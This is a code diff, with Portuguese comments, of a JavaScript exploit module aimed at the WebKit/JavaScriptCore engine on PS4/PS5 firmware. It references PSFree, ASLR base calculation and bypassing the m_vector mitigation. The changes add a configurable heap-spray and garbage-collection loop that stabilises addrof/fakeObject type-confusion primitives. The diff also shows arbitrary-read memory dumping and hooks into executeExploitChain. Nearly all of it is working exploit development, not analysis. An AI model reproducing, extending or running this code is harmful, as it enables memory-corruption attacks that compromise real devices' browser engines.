@@ -1,4 +1,4 @@
-//script3/testArrayBufferVictimCrash.mjs (v22 - Calculo ASLR CORRETO da Base WebKit - Integrado com PSFree - VERSÃO DE DEPURACAO)
+//script3/testArrayBufferVictimCrash.mjs (ATUALIZADO PARA DEPURAÇÃO DE HEAP E TESTE ISOLADO)
 
 // =======================================================================================
 // ESTA VERSÃO TENTA BYPASSAR AS MITIGAÇÕES DO m_vector MANIPULANDO OFFSETS DE CONTROLE.
@@ -34,7 +34,6 @@ import {
     resolve_import, // Importa resolve_import
     get_view_vector // Importa get_view_vector
 } from '../module/memtools.mjs';
-// A importação de 'offset.mjs' foi removida pois os offsets estão agora em 'config.mjs'
 
 export const FNAME_MODULE = "v22 - Calculo ASLR CORRETO da Base WebKit"; // Versão atualizada
 
@@ -58,6 +57,52 @@ const num_spaces_groom = 0x40; // Número de framesets para preencher espaços n
 const ssv_len_psfree = 0x50; // Tamanho do SerializedScriptValue na PS4 9.xx e PS5 suportadas
 const rows_frameset = ','.repeat(ssv_len_psfree / 8 - 2); // String para 'rows' do frameset
 
+// =======================================================================================
+// NOVA FUNÇÃO DE TESTE ISOLADO PARA ESTABILIZAÇÃO DAS PRIMITIVAS
+// =======================================================================================
+export async function testAndStabilizeCorePrimitives(logFn, pauseFn) {
+    logFn("--- Iniciando Teste de Estabilização das Primitivas Core (addrof/fakeobj) ---", "test");
+    let success = false;
+    try {
+        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
+        
+        // Parâmetros de configuração para o heap spray.
+        // ***** AJUSTE ESTES VALORES PARA EXPERIMENTAR *****
+        const SPRAY_CONFIG = {
+            ATTEMPTS: 300,        // Número de tentativas para estabilizar.
+            GC_INTERVAL: 10,      // Forçar Garbage Collection a cada X tentativas.
+            SPRAY_COUNT: 100,     // Número de objetos de lixo para alocar em cada tentativa.
+            OBJECT_SIZE_MIN: 32,
+            OBJECT_SIZE_MAX: 128
+        };
+
+        success = await stabilizeCorePrimitives(logFn, pauseFn, JSC_OFFSETS, SPRAY_CONFIG);
+
+        if (success) {
+            logFn("++++++++ SUCESSO: Primitivas Core (addrof/fakeobj) foram estabilizadas! ++++++++", "vuln");
+            // Teste final para garantir
+            const test_obj = { final_check: 0x12345678 };
+            const addr = getAddress(test_obj);
+            const faked = fakeObject(addr);
+            if (faked.final_check === 0x12345678) {
+                logFn("Verificação final bem-sucedida. Primitivas estão funcionando.", "good");
+            } else {
+                logFn("Verificação final FALHOU. Primitivas instáveis.", "error");
+                success = false;
+            }
+        } else {
+            logFn("-------- FALHA: Não foi possível estabilizar as primitivas Core. --------", "critical");
+        }
+    } catch (e) {
+        logFn(`ERRO CRÍTICO durante o teste de estabilização: ${e.message}\n${e.stack || ''}`, "critical");
+        success = false;
+    } finally {
+        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
+        logFn("--- Teste de Estabilização Concluído ---", "test");
+    }
+    return success;
+}
+
 // Funções Auxiliares Comuns (dumpMemory)
 async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") {
     logFn(`[${sourceName}] Iniciando dump de ${size} bytes a partir de ${address.toString(true)}`, "debug");
@@ -70,7 +115,7 @@ async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") 
         for (let j = 0; j < bytesPerRow; j++) {
             if (i + j < size) {
                 try {
-                    const byte = await arbReadFn(address.add(i + j), 1);
+                    const byte = await arbReadFn(address.add(i + j), 1, logFn);
                     rowBytes.push(byte);
                     hexLine += byte.toString(16).padStart(2, '0') + " ";
                     asciiLine += (byte >= 0x20 && byte <= 0x7E) ? String.fromCharCode(byte) : '.';
@@ -261,134 +306,84 @@ async function triggerGC(logFn, pauseFn) {
 
 /**
  * Tenta um Type Confusion direto para obter primitivas getAddress/fakeObject.
+ * ESTA FUNÇÃO FOI COMPLETAMENTE REFATORADA PARA SER MAIS AGRESSIVA E CONFIGURÁVEL.
  * @param {Function} logFn Função de log.
  * @param {Function} pauseFn Função de pausa.
  * @param {object} JSC_OFFSETS_PARAM Offsets JSC.
+ * @param {object} config Configurações do spray de heap.
  * @returns {Promise<boolean>} True se getAddress/fakeObject foram estabilizados.
  */
-async function stabilizeCorePrimitives(logFn, pauseFn, JSC_OFFSETS_PARAM) {
+async function stabilizeCorePrimitives(logFn, pauseFn, JSC_OFFSETS_PARAM, config) {
     const FNAME = "stabilizeCorePrimitives";
-    logFn(`[${FNAME}] Iniciando estabilização de getAddress/fakeObject via Heisenbug.`, "subtest", FNAME);
+    logFn(`[${FNAME}] Iniciando estabilização com ${config.ATTEMPTS} tentativas.`, "subtest", FNAME);
 
-    initializeCorePrimitives(); // Garante que confusedFloat64Array e victimArray existam
+    initializeCorePrimitives(); // Garante que os arrays base existam
 
-    // AUMENTADO O NÚMERO DE TENTATIVAS PARA MAIOR ROBUSTEZ.
-    // ESTE VALOR PODE PRECISAR DE AJUSTE FINO PARA A FW 12.02.
-    const NUM_STABILIZATION_ATTEMPTS = 200;
-    const GC_INTERVAL_ATTEMPTS = 5; // A cada 5 tentativas, força um GC
+    for (let i = 0; i < config.ATTEMPTS; i++) {
+        if (i % 25 === 0) { // Log de progresso
+             logFn(`[${FNAME}] Tentativa de estabilização #${i + 1}/${config.ATTEMPTS}.`, "info", FNAME);
+        }
+        
+        heldObjects = [];
 
-    for (let i = 0; i < NUM_STABILIZATION_ATTEMPTS; i++) {
-        logFn(`[${FNAME}] Tentativa de estabilização #${i + 1}/${NUM_STABILIZATION_ATTEMPTS}.`, "info", FNAME);
-
-        heldObjects = []; // Limpar heldObjects para cada tentativa, para influenciar o GC/heap layout
-        // Forçar GC mais agressivamente em intervalos.
-        if (i > 0 && i % GC_INTERVAL_ATTEMPTS === 0) {
-            logFn(`[${FNAME}] Forçando GC na tentativa #${i + 1}...`, "info", FNAME);
-            await triggerGC(logFn, pauseFn);
-            logFn(`[${FNAME}] Heap limpo antes da tentativa de estabilização.`, "info", FNAME);
-            await pauseFn(LOCAL_MEDIUM_PAUSE); // Pausa mais longa após GC
-        } else {
-            await pauseFn(LOCAL_SHORT_SHORT_PAUSE); // Pequena pausa para JIT/GC suave entre tentativas
+        // 1. Spray de "lixo" para preparar o heap
+        for (let j = 0; j < config.SPRAY_COUNT; j++) {
+            const size = config.OBJECT_SIZE_MIN + (j % (config.OBJECT_SIZE_MAX - config.OBJECT_SIZE_MIN));
+            heldObjects.push(new Array(size).fill(j));
         }
 
+        // 2. Forçar Coleta de Lixo em intervalos para criar "buracos" no heap
+        if (i > 0 && i % config.GC_INTERVAL === 0) {
+            await triggerGC(logFn, pauseFn);
+        } else {
+            await pauseFn(LOCAL_VERY_SHORT_PAUSE);
+        }
+
+        // 3. Alocar o objeto de teste que queremos que caia no "buraco" certo
+        const test_obj_val = {
+            a: 0x11223344 + i,
+            b: 0x55667788,
+            c: `test_string_${i}`,
+            d: new Uint32Array([i, i + 1, i + 2])
+        };
+        heldObjects.push(test_obj_val);
+
+        // 4. "Aqueçer" os objetos para encorajar o JIT a otimizá-los
+        for(let k=0; k<heldObjects.length; k++) {
+            if(heldObjects[k] && heldObjects[k].length) {
+                let tmp = heldObjects[k][0]; // Operação de leitura
+            }
+        }
+        
         try {
-            // Tentar diferentes tipos de objetos ou variações para testar o addrof/fakeobj
-            let test_obj_val;
-            if (i % 2 === 0) {
-                test_obj_val = { a: 0x11223344, b: 0x55667788, c: "test_string_" + i };
+            // 5. Tentar acionar a vulnerabilidade e verificar
+            const addr = getAddress(test_obj_val); // Usa a função com logs melhorados
+
+            // A verificação crucial é se o endereço mudou. Se ainda for a representação de 13.37, falhou.
+            if (addr.lo === 0xa3d70a3d && addr.hi === 0xbd70) {
+                 if (i % 25 === 0) { // Logar apenas de vez em quando para não poluir
+                    logFn(`[${FNAME}] Tentativa #${i+1} ainda retornou o endereço de '13.37'. Vulnerabilidade não acionada.`, "debug", FNAME);
+                 }
+                continue; // Tenta novamente
+            }
+
+            logFn(`[${FNAME}] SUCESSO POTENCIAL! Endereço diferente de '13.37' foi lido: ${addr.toString(true)}`, "good", FNAME);
+
+            // 6. Verificar se a primitiva fakeObject também funciona
+            const faked_obj = fakeObject(addr);
+            if (faked_obj && typeof faked_obj === 'object' && faked_obj.a === test_obj_val.a) {
+                logFn(`[${FNAME}] CONFIRMADO! getAddress e fakeObject estão consistentes!`, "vuln", FNAME);
+                return true; // SUCESSO!
             } else {
-                test_obj_val = [0xAA, 0xBB, 0xCC, i];
-            }
-            heldObjects.push(test_obj_val); // Garante que test_obj_val seja mantido
-
-            // Adicionar mais objetos ao spray para influenciar o heap layout
-            for(let j = 0; j < 50; j++) { // Mais objetos para forçar o layout
-                heldObjects.push({ dummy_a: j * i, dummy_b: j * i * 2, arr: new Array(j*10 + i).fill(j % 255), str: `spray_str_${i}_${j}` });
-            }
-
-
-            const addr = getAddress(test_obj_val); // Retorna Int
-            logFn(`[${FNAME}] getAddress para test_obj (${test_obj_val.toString()}) resultou em: ${addr.toString(true)}`, "debug", FNAME);
-            logFn(`[${FNAME}] Tipo de addr: ${typeof addr}, instance of Int: ${addr instanceof Int}`, "debug", FNAME);
-
-            if (!(addr instanceof Int) || addr.eq(new Int(0,0))) {
-                logFn(`[${FNAME}] FALHA: getAddress retornou endereço inválido para test_obj. ENDERECO: ${addr.toString(true)}`, "error", FNAME);
-                throw new Error("getAddress falhou na estabilização.");
-            }
-
-            const faked_obj = fakeObject(addr); // addr é Int
-            logFn(`[${FNAME}] Objeto forjado: ${faked_obj} (typeof: ${typeof faked_obj})`, "debug", FNAME);
-            
-            // VERIFICAÇÃO MAIS ROBUSTA DO OBJETO FORJADO
-            if (typeof faked_obj !== 'object' && typeof faked_obj !== 'function') {
-                 logFn(`[${FNAME}] FALHA: fakeObject retornou tipo inesperado: ${typeof faked_obj}.`, "error", FNAME);
-                 throw new Error("fakeObject retornou tipo inesperado.");
-            }
-
-            // Acessar propriedades comuns para testar se é um objeto JS válido.
-            // Se test_obj_val é um objeto simples, acessa 'a'. Se for um array, tenta 'length'.
-            let original_val_prop;
-            if (test_obj_val.hasOwnProperty('a')) {
-                original_val_prop = faked_obj.a;
-                logFn(`[${FNAME}] DEBUG: Acessando faked_obj.a. Original: ${toHex(test_obj_val.a)}`, "debug", FNAME);
-                faked_obj.a = 0xDEADC0DE; // Tentar escrever
-                await pauseFn(LOCAL_VERY_SHORT_PAUSE);
-                const new_val_a = faked_obj.a;
-                if (new_val_a === 0xDEADC0DE && test_obj_val.a === 0xDEADC0DE) {
-                    logFn(`[${FNAME}] SUCESSO: faked_obj.a R/W consistente.`, "good", FNAME);
-                    faked_obj.a = original_val_prop; // Restaurar
-                    return true;
-                } else {
-                    logFn(`[${FNAME}] FALHA: faked_obj.a R/W inconsistente. Original: ${toHex(original_val_prop)}, Escrito: ${toHex(0xDEADC0DE)}, Lido: ${toHex(new_val_a)}.`, "error", FNAME);
-                    throw new Error("fakeObject R/W inconsistent (property 'a').");
-                }
-            } else if (Array.isArray(test_obj_val)) {
-                // Se for um array, testar 'length' ou um elemento
-                original_val_prop = faked_obj.length;
-                logFn(`[${FNAME}] DEBUG: Acessando faked_obj.length. Original: ${toHex(test_obj_val.length)}`, "debug", FNAME);
-                // Cuidado ao escrever em 'length' de um array forjado, pode corromper.
-                // Apenas ler pode ser mais seguro para estabilização inicial.
-                if (original_val_prop === test_obj_val.length) {
-                    logFn(`[${FNAME}] SUCESSO: faked_obj.length leitura consistente.`, "good", FNAME);
-                    // Tentar acessar um elemento (se existir)
-                    if (test_obj_val.length > 0) {
-                        const original_elem = faked_obj[0];
-                        faked_obj[0] = 0xBBCCDD; // Tentar escrever num elemento
-                        await pauseFn(LOCAL_VERY_SHORT_PAUSE);
-                        const new_elem = faked_obj[0];
-                        if (new_elem === 0xBBCCDD && test_obj_val[0] === 0xBBCCDD) {
-                            logFn(`[${FNAME}] SUCESSO: faked_obj[0] R/W consistente.`, "good", FNAME);
-                            faked_obj[0] = original_elem; // Restaurar
-                            return true;
-                        } else {
-                            logFn(`[${FNAME}] FALHA: faked_obj[0] R/W inconsistente. Original: ${toHex(original_elem)}, Escrito: ${toHex(0xBBCCDD)}, Lido: ${toHex(new_elem)}.`, "error", FNAME);
-                            throw new Error("fakeObject R/W inconsistent (indexed property).");
-                        }
-                    } else { // Array vazio, apenas leitura de length verificada. Considerar sucesso.
-                         return true;
-                    }
-                } else {
-                    logFn(`[${FNAME}] FALHA: faked_obj.length leitura inconsistente. Lido: ${toHex(original_val_prop)}, Esperado: ${toHex(test_obj_val.length)}.`, "error", FNAME);
-                    throw new Error("fakeObject R/W inconsistent (property 'length').");
-                }
-            } else {
-                logFn(`[${FNAME}] ALERTA: test_obj_val não é um objeto ou array comum para teste de R/W. Tipo: ${typeof test_obj_val}.`, "warn", FNAME);
-                try {
-                    const keys = Object.keys(faked_obj);
-                    logFn(`[${FNAME}] DEBUG: faked_obj tem ${keys.length} chaves: ${keys.join(',')}.`, "debug", FNAME);
-                    return true; // Se não crashou e tem chaves, talvez seja válido.
-                } catch (inspection_error) {
-                    logFn(`[${FNAME}] FALHA: Erro ao inspecionar objeto forjado: ${inspection_error.message}.`, "error", FNAME);
-                    throw new Error("Fake object inspection failed.");
-                }
+                logFn(`[${FNAME}] FALHA DE CONSISTÊNCIA. O objeto forjado não corresponde ao original. Lido: ${faked_obj.a}, Esperado: ${test_obj_val.a}`, "warn", FNAME);
             }
 
         } catch (e) {
-            logFn(`[${FNAME}] Erro durante tentativa de estabilização: ${e.message}\n${e.stack || ''}`, "warn", FNAME);
+            logFn(`[${FNAME}] Erro durante tentativa de estabilização: ${e.message}`, "warn", FNAME);
         }
     }
 
-    logFn(`[${FNAME}] FALHA CRÍTICA: Não foi possível estabilizar as primitivas getAddress/fakeObject após ${NUM_STABILIZATION_ATTEMPTS} tentativas.`, "critical", FNAME);
+    logFn(`[${FNAME}] FALHA CRÍTICA: Não foi possível estabilizar as primitivas após ${config.ATTEMPTS} tentativas.`, "critical", FNAME);
     return false;
 }
 
@@ -492,7 +487,9 @@ export async function executeExploitChain(logFn, pauseFn) {
         await pauseFn(LOCAL_SHORT_PAUSE);
 
         // ESTE É O BLOCO MAIS CRÍTICO AGORA: A ESTABILIZAÇÃO DE GETADDRESS/FAKEOBJECT
-        const addrof_fakeobj_stable = await stabilizeCorePrimitives(logFn, pauseFn, JSC_OFFSETS);
+        const addrof_fakeobj_stable = await stabilizeCorePrimitives(logFn, pauseFn, JSC_OFFSETS, {
+            ATTEMPTS: 200, GC_INTERVAL: 10, SPRAY_COUNT: 100, OBJECT_SIZE_MIN: 32, OBJECT_SIZE_MAX: 128
+        });
         if (!addrof_fakeobj_stable) {
             const errMsg = "Falha crítica: Não foi possível estabilizar getAddress/fakeObject. Abortando exploração.";
             logFn(errMsg, "critical");
